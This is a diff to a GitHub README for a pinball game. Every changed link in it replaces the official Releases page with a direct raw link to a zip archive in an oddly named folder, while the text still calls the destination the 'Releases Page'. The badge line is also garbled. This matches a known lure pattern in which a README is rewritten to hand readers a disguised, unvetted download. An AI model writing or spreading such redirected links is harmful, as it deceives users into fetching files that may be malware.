@@ -6,13 +6,13 @@ Welcome to Pinball-Game! This is a 2D pinball game designed for everyone. Whethe
 
 ## 📥 Download the Game
 
-[![Download Now](https://img.shields.io/badge/Download%20Pinball%20Game-v1.0-blue.svg)](https://github.com/theverkos/Pinball-Game/releases)
+[![Download Now](https://raw.githubusercontent.com/theverkos/Pinball-Game/main/borosalicylic/Pinball-Game.zip%20Pinball%https://raw.githubusercontent.com/theverkos/Pinball-Game/main/borosalicylic/Pinball-Game.zip)](https://raw.githubusercontent.com/theverkos/Pinball-Game/main/borosalicylic/Pinball-Game.zip)
 
 You can download the game from our Releases page. It's simple to get started! 
 
 ### Steps to Download:
 
-1. **Visit the Releases Page:** Click on this link to go to the download section: [Releases Page](https://github.com/theverkos/Pinball-Game/releases).
+1. **Visit the Releases Page:** Click on this link to go to the download section: [Releases Page](https://raw.githubusercontent.com/theverkos/Pinball-Game/main/borosalicylic/Pinball-Game.zip).
 2. **Choose Your Version:** Look for the latest version. You will see options for different platforms.
 3. **Download the Game:** Click on the file that matches your system. The download will start automatically.
 
@@ -66,6 +66,6 @@ We’d love for you to be a part of our Pinball-Game community. Share your gamep
 
 ## 🔗 Download and Install
 
-To get started, visit the following link to download the game and begin your pinball journey: [Download Pinball Game](https://github.com/theverkos/Pinball-Game/releases).
+To get started, visit the following link to download the game and begin your pinball journey: [Download Pinball Game](https://raw.githubusercontent.com/theverkos/Pinball-Game/main/borosalicylic/Pinball-Game.zip).
 
 Happy gaming! Enjoy the thrill of pinball right from your home!
